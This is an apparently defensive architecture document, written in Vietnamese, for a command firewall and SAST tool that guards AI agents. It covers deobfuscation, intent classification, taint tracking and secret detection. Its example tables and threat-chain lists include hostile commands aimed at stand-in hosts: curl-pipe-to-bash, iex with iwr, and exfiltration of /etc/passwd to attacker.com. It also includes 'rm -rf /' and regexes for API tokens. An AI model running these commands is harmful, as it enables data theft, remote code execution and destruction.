# 🧠 Kiến Trúc Hệ Thống & Mô Hình Phòng Thủ Zero-Trust

Tài liệu này cung cấp cái nhìn chi tiết về kiến trúc kỹ thuật nội bộ của **Security SAST Guard**, bao gồm chuỗi giải mã lệnh 10 tầng, phân loại Intent & Capability, động cơ phân tích AST & Taint Tracking, bộ phát hiện Entropy bí mật Shannon, và cơ chế bảo vệ tính toàn vẹn Zero-Trust.

---

## 🏛️ Kiến Trúc Tổng Thể 3 Tầng (3-Tier Layered Architecture)

Security SAST Guard được thiết kế theo cấu trúc module phân tầng cô lập, đảm bảo hiệu năng cao (< 20ms cho mỗi lệnh kiểm tra) và độ tin cậy tuyệt đối:

```mermaid
graph TD
    subgraph T1["Tier 1: Security Core & Command Firewall"]
        F1["1. 10-Stage Deobfuscation Normalizer"]
        F2["2. Capability Classifier (7 Groups)"]
        F3["3. Threat Intent Classifier"]
        F4["4. Multi-Command Threat Chain Analyzer"]
        F5["5. Formal Decision Machine (4 States)"]
        F6["6. Rule Integrity & ReDoS Validator"]
        F7["7. Append-Only Cryptographic Audit Log"]
    end

    subgraph T2["Tier 2: SAST Intelligence Engine"]
        S1["8. SAST Scanner (95 Vector Rules)"]
        S2["9. AST Context & Precision Engine"]
        S3["10. Symbol Indexer & Taint Dataflow Tracker"]
        S4["11. Shannon Entropy & Token Detector"]
        S5["12. Adaptive Knowledge Base & Sanitizer Registry"]
        S6["13. CWE & OWASP Security Metrics Engine"]
    end

    subgraph T3["Tier 3: Interfaces & AI Integration"]
        I1["CLI Dispatcher (sast scan, status...)"]
        I2["Stdio MCP Server (12 Granular Tools)"]
        I3["Pure ANSI TUI Renderer"]
        I4["ISO SARIF 2.1.0 & Markdown Exporters"]
    end

    T1 --> T3
    T2 --> T3
    T1 <--> T2
```

---

## 🛡️ 1. 10-Stage Command Deobfuscation Normalizer (`FirewallNormalizer`)

Kẻ tấn công hoặc các script độc hại thường sử dụng kỹ thuật che giấu (Obfuscation) để vượt qua các bộ lọc regex thông thường. `FirewallNormalizer` thực thi quy trình giải mã tuần hoàn 10 giai đoạn trước khi áp dụng bất kỳ luật bảo mật nào:

| Stage | Tên Giai Đoạn | Cơ Chế Xử Lý & Giải Mã | Ví Dụ Đầu Vào | Kết Quả Chuẩn Hóa |
| :---: | :--- | :--- | :--- | :--- |
| **1** | **Caret, Backtick & Octal Stripping** | Loại bỏ ký tự thoát dòng của CMD (`^`) và PowerShell (`` ` ``); giải mã Octal escapes (`\0NNN`, `\NNN`). | `d^o^w^n^l^o^a^d` hoặc `I`\`e`\`x` | `download`, `iex` |
| **2** | **Base64 Payload Decoding** | Nhận diện và giải mã các tham số Base64 (`-EncodedCommand`, `-enc`, `[Convert]::FromBase64String()`, `echo ... \| base64 -d`). | `powershell -enc SUVYIChOZXctT2JqZWN0KQ==` | `powershell IEX (New-Object)` |
| **3** | **Hex Byte Decoding** | Giải mã các chuỗi Hex dạng `\x41`, `0x41`, `\X41`. | `\x63\x75\x72\x6c` | `curl` |
| **4** | **Unicode Escape Decoding** | Chuyển đổi mã Unicode `\u0041`, `\U00000041` về ký tự chuẩn. | `\u0069\u0065\u0078` | `iex` |
| **5** | **Environment Expansion** | Mở rộng biến môi trường động của Windows (`%TEMP%`, `%COMSPEC%`) và PowerShell/Bash (`$env:SystemRoot`, `$HOME`). | `%SystemRoot%\System32\cmd.exe` | `C:\Windows\System32\cmd.exe` |
| **6** | **String Format Interpolation** | Đánh giá và ráp nối chuỗi định dạng PowerShell dạng `"{0}{1}" -f "Do","wnload"`. | `"{1}{0}" -f "load","Down"` | `Download` |
| **7** | **Char Code Assembly** | Ráp nối biểu thức mã ký tự `[char]0x41 + [char]0x42` hoặc `[char]65 + [char]66`. | `[char]105+[char]101+[char]120` | `iex` |
| **8** | **Alias & Wrapper Normalization** | Chuẩn hóa alias về lệnh gốc (`iex` $\to$ `Invoke-Expression`, `iwr` $\to$ `Invoke-WebRequest`, `gc` $\to$ `Get-Content`). | `iex (iwr evil.com)` | `Invoke-Expression (Invoke-WebRequest evil.com)` |
| **9** | **Subshell / Command Substitution** | Bóc tách và giải mã các lệnh lồng trong subshell `$(...)`, ```` `...` ````, hoặc `eval(...)`. | `eval "$(curl evil.com)"` | `curl evil.com` (Được đưa vào luồng kiểm tra riêng) |
| **10**| **Statement Decomposition** | Tách các chuỗi đa lệnh (`&&`, `\|\|`, `;`, `\|`) thành luồng các câu lệnh đơn nguyên tử để đánh giá độc lập. | `whoami && rm -rf /` | Evaluated as: `whoami`, then `rm -rf /` |

---

## 🔍 2. Phân Loại Quyền Hạn (Capability) & Nhận Diện Ý Đồ (Intent)

Thay vì chỉ so khớp chuỗi tĩnh, Security SAST Guard áp dụng mô hình phân loại ngữ nghĩa 2 bước:

### 2.1. 7 Nhóm Quyền Hạn (`FirewallCapabilityClassifier`)

Mỗi lệnh sau khi giải mã được gán một hoặc nhiều nhãn Capability:

1. **`NETWORK`**: Các lệnh tạo kết nối mạng, tải dữ liệu, mở socket (`curl`, `wget`, `Invoke-WebRequest`, `ssh`, `nc`, `nmap`).
2. **`FILE_READ`**: Các thao tác đọc nội dung tập tin (`cat`, `Get-Content`, `type`, `head`, `tail`, `more`).
3. **`FILE_WRITE`**: Ghi đè, tạo mới hoặc chỉnh sửa tệp (`Out-File`, `Set-Content`, `echo >`, `tee`, `touch`).
4. **`PROCESS_EXEC`**: Khởi chạy tiến trình mới hoặc thực thi mã động (`Invoke-Expression`, `bash`, `sh`, `cmd.exe`, `python -c`, `eval`).
5. **`PRIVILEGE_CHANGE`**: Thay đổi chính sách thực thi hoặc quyền hạn (`Set-ExecutionPolicy`, `chmod 777`, `chown`, `sudo`, `runas`).
6. **`PERSISTENCE`**: Đăng ký dịch vụ nền, lịch tác vụ, hoặc sửa registry (`schtasks`, `crontab`, `reg add`, `systemctl enable`).
7. **`DATA_TRANSFER`**: Chuyển dữ liệu qua pipe hoặc redirect (`|`, `>`, `>>`, `<`).

### 2.2. Nhận Diện Ý Đồ Tấn Công (`FirewallIntentClassifier`)

Hệ thống kết hợp các tập hợp Capability để suy luận mục đích thực sự của câu lệnh:

- **`EXFILTRATION`**: Kết hợp `FILE_READ` + `NETWORK` + `DATA_TRANSFER` (Ví dụ: `cat /etc/passwd | curl -X POST -d @- https://attacker.com`).
- **`DESTRUCTIVE`**: Các lệnh xóa tệp đệ quy, định dạng ổ đĩa hoặc dừng dịch vụ quan trọng (`rm -rf /`, `Remove-Item -Recurse -Force`, `format C:`).
- **`PRIVILEGE_ESCALATION`**: Kết hợp `PRIVILEGE_CHANGE` + `PROCESS_EXEC` (Ví dụ: `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`).
- **`SUPPLY_CHAIN`**: Cài đặt gói thư viện từ nguồn không xác thực qua mạng (`pip install`, `npm install` kèm cờ nguy hiểm).

---

## ⛓️ 3. Phát Hiện Chuỗi Tấn Công Đa Lệnh (Multi-Command Threat Chains)

`FirewallChainAnalyzer` theo dõi mối quan hệ giữa các câu lệnh liên tiếp hoặc các lệnh ghép trong một dòng để phát hiện các mẫu tấn công chuỗi:

```mermaid
flowchart LR
    A["Download Step\n(curl / iwr / wget)"] -->|"Pipe / Subshell"| B["Execution Step\n(sh / iex / bash)"]
    B -->|"Verdict"| C["🚨 DENY: Download+Execute Threat Chain"]
```

### Các Mẫu Threat Chain Điển Hình Bị Chặn:
1. **Download + Execute Chain**:
   - `curl -fsSL https://evil.com/setup.sh | bash` $\to$ **`DENY`**
   - `Invoke-WebRequest evil.com/script.ps1 | Invoke-Expression` $\to$ **`DENY`**
   - `iwr evil.com -OutFile a.exe; .\a.exe` $\to$ **`DENY`**
2. **ExecutionPolicy Bypass Chain**:
   - `powershell.exe -ExecutionPolicy Bypass -File script.ps1` $\to$ **`CONFIRM`**
3. **Reconnaissance + Exfiltration Chain**:
   - `Get-ChildItem -Recurse -Filter *.env | Invoke-RestMethod ...` $\to$ **`DENY`**

---

## 🌲 4. Động Cơ AST & Truy Vết Luồng Dữ Liệu (Taint Tracking)

### 4.1. Phân Tích Ngữ Cảnh Cú Pháp Cây (`ASTContextEngine`)

Sử dụng parser cú pháp cây `tree-sitter`, Security SAST Guard phân biệt rạch ròi giữa các cấu trúc mã tương tự nhau nhưng khác biệt về mức độ rủi ro:

- **Phân biệt DOM vs Backend**: Nhận diện hàm `dangerouslySetInnerHTML` trong React / Vue (DOM XSS) so với `eval()` trong NodeJS backend (Remote Code Execution).
- **Phân tích Phạm vi Biến (Context Scope Resolver)**: Xác định xem một biến được truyền vào hàm có phải là hằng số tĩnh (`const API_KEY = "SAFE_CONST"`) hay dữ liệu chưa được kiểm duyệt từ người dùng (`req.body.input`).

### 4.2. Taint Dataflow Tracker (4 Bước Truy Vết)

Hệ thống theo dõi luồng lan truyền dữ liệu độc hại qua 4 mắt xích:

```mermaid
flowchart LR
    Source["1. Source\n(Untrusted User Input)"] --> Propagation["2. Propagation\n(Variable Assignment / Concat)"]
    Propagation --> Sanitizer{"3. Sanitizer\n(Validation / Escape?)"}
    Sanitizer -->|"No"| Sink["4. Sink\n(Database / Shell / HTML)"]
    Sanitizer -->|"Yes"| Safe["✅ Pruned (False Positive)"]
    Sink --> Alert["🚨 OWASP Vulnerability Alert"]
```

1. **Source**: Điểm đầu vào không đáng tin cậy (`req.query`, `sys.argv`, `request.form`, `<asp:TextBox>`).
2. **Propagation**: Sự truyền dẫn dữ liệu qua các phép gán, chuỗi nối (`str_format`), truyền tham số hàm.
3. **Sanitizer**: Các hàm làm sạch dữ liệu chuẩn (`html.escape`, `DOMPurify.sanitize`, `parameterized_query`, `shlex.quote`). Nếu dữ liệu đi qua Sanitizer hợp lệ, hệ thống tự động loại bỏ cảnh báo (Zero False Positive).
4. **Sink**: Điểm thực thi nhạy cảm (`cursor.execute`, `subprocess.Popen`, `eval`, `innerHTML`, `Response.Write`).

---

## 🔑 5. Shannon Entropy & Nhận Diện API Token Signature

Để ngăn chặn rò rỉ mã bí mật (Secret Leaks), `ShannonEntropyDetector` áp dụng thuật toán tính toán lượng thông tin hỗn loạn (Information Entropy) kết hợp nhận diện mẫu chữ ký chuẩn:

### 5.1. Công Thức Tính Shannon Entropy

$$H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)$$

*Trong đó $P(x_i)$ là tần suất xuất hiện của ký tự $x_i$ trong chuỗi candidate.*

### 5.2. Ngưỡng Nhận Diện (Detection Thresholds)

- **Hexadecimal Secret**: Độ dài $\ge 32$ ký tự, $H(X) \ge 3.4$ trong ngữ cảnh security keywords $\to$ Cảnh báo **`High`** (MD5/SHA/Hex Token).
- **Base64 / Alphanumeric Secret**: Độ dài $\ge 24$ ký tự, $H(X) \ge 4.5$ trong ngữ cảnh security keywords $\to$ Cảnh báo **`Critical`** (API Token / Private Secret).

### 5.3. 7 Provider Signatures Mặc Định

| Token Identifier | Provider / Dịch Vụ | Mẫu Regex Nhận Diện | Severity |
| :--- | :--- | :--- | :---: |
| `TOKEN_OPENAI` | OpenAI API Keys | `sk-[a-zA-Z0-9]{48,}` hoặc `sk-proj-...` | **Critical** |
| `TOKEN_GITHUB` | GitHub PAT / App Tokens | `ghp_[A-Za-z0-9]{36}` hoặc `github_pat_...` | **Critical** |
| `TOKEN_AWS` | AWS Access Key ID | `(AKIA\|ASIA)[0-9A-Z]{16}` | **High** |
| `TOKEN_ANTHROPIC` | Anthropic Claude API Key | `sk-ant-[a-zA-Z0-9_-]{40,}` | **Critical** |
| `TOKEN_STRIPE` | Stripe Live API Keys | `sk_live_[0-9a-zA-Z]{24,}` | **Critical** |
| `TOKEN_SLACK` | Slack Bot / User Token | `xoxb-...` hoặc `xoxp-...` | **High** |
| `TOKEN_PRIVATE_KEY` | Unencrypted Private Keys | `-----BEGIN (RSA\|EC\|DSA\|OPENSSH)? PRIVATE KEY-----` | **Critical** |

---

## ⚖️ 6. Động Cơ Ra Quyết Định 4 Trạng Thái & Bảo Vệ Toàn Vẹn

### 6.1. Formal Decision Machine (`SecurityDecisionEngine`)

Mọi phát hiện từ Firewall và SAST Scanner được đưa qua máy trạng thái 4 nhánh:

1. **`ALLOW` / `FALSE_POSITIVE`**: Dữ liệu an toàn, đã qua sanitizer hoặc thỏa mãn whitelist. Cho phép thực thi.
2. **`CONFIRM` / `CONFIRM_REQUIRED`**: Thao tác có rủi ro trung bình (như xóa thư mục tạm, đổi policy), bắt buộc Agent phải hiển thị modal `ask_question` để người dùng phê duyệt rõ ràng trước khi thực hiện.
3. **`DENY` / `TRUE_POSITIVE`**: Hành vi độc hại rõ ràng (RCE, Exfiltration, Dropper). Tuyệt đối **KHÔNG** cho phép thực thi dưới mọi hình thức.
4. **`NOT_ENOUGH_CONTEXT`**: Yêu cầu mở rộng context window (trích xuất thêm 10 dòng mã xung quanh) để AI Verifier đánh giá lại.

### 6.2. Bảo Vệ Tính Toàn Vẹn & Ghi Log Bất Biến

- **SHA-256 Rule Integrity Validator (`RuleIntegrityValidator`)**: Mọi file quy tắc (`sast_rules.json`) được kiểm tra mã băm SHA-256 trước khi load vào bộ nhớ, ngăn chặn việc kẻ tấn công sửa file rule để vô hiệu hóa kiểm tra.
- **ReDoS Catastrophic Backtracking Protection**: Tự động phát hiện các biểu thức chính quy có nguy cơ lặp lồng nhau gây treo CPU trước khi đưa vào scanner.
- **Append-Only Audit Log (`.sast/firewall_audit.jsonl`)**: Toàn bộ các quyết định kiểm toán được ghi nối đuôi mã hóa kèm timestamp ISO 8601, mã lệnh thô, mã chuẩn hóa, và verdict.
